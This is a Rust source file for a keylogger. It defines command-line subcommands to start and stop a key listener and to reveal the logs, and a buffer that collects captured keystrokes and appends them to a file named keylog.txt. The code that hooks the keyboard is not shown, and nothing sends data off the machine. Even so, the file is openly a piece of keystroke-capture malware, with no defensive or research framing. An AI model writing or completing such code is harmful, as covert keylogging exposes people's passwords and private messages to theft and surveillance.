use clap::{Subcommand, Parser};
use std::sync::Mutex;
use std::fs::OpenOptions;
use std::io::Write;
use once_cell::sync::Lazy;


#[derive(Parser, Debug)]
#[command(name = "")]
pub struct KeyloggerCommands {
    #[command(subcommand)]
    pub command: Commands,
}

#[derive(Subcommand, Debug)]
pub enum Commands {
    /// Starts key listener
    StartKeyListener,
    /// Stops key listener
    StopKeyListener,
    /// Reveals keylogger logs
    ShowLogs {
        #[arg[short = 'v', long = "verbose"]]
        verbose: bool
    },
    /// Quit Program
    QuitProgram,
}

/// Manages buffered keyboard input logging with configurable buffer size
pub struct KeyBuffer {
    buffer: Vec<u16>,
    max_size: usize,
    log_file_path: String,
}

impl KeyBuffer {
    /// Creates a new KeyBuffer with default settings
    pub fn new() -> Self {
        Self::with_capacity(8, "keylog.txt")
    }
    
    /// Creates a KeyBuffer with custom capacity and file path
    pub fn with_capacity(max_size: usize, log_file_path: &str) -> Self {
        Self {
            buffer: Vec::with_capacity(max_size),
            max_size,
            log_file_path: log_file_path.to_string(),
        }
    }
    
    /// Adds characters to the buffer, flushing to disk when full
    pub fn push_chars(&mut self, chars: &[u16]) -> Result<(), std::io::Error> {
        // If adding these chars would exceed capacity, flush first
        if self.len() + chars.len() >= self.max_size {
            self.flush_to_disk()?;
        }
        
        self.buffer.extend_from_slice(chars);
        Ok(())
    }
    
    /// Forces a flush of the current buffer to the disk
    pub fn flush_to_disk(&mut self) -> Result<(), std::io::Error> {
        if self.is_empty() {
            return Ok(());
        }
        
        let content = String::from_utf16(&self.buffer)
            .map_err(|_| std::io::Error::new(
                std::io::ErrorKind::InvalidData, 
                "Invalid UTF-16 sequence"
            ))?;
            
        let mut file = OpenOptions::new()
            .create(true)
            .append(true)
            .open(&self.log_file_path)?;
            
        file.write_all(content.as_bytes())?;
        file.flush()?;
        
        self.buffer.clear();
        Ok(())
    }
    
    /// Returns the current buffer size
    pub fn len(&self) -> usize {
        self.buffer.len()
    }
    
    /// Checks if the buffer is empty
    pub fn is_empty(&self) -> bool {
        self.buffer.is_empty()
    }
}

// Thread-safe global instance
pub static GLOBAL_KEY_BUFFER: Lazy<Mutex<KeyBuffer>> = Lazy::new(|| {
    Mutex::new(KeyBuffer::new())
});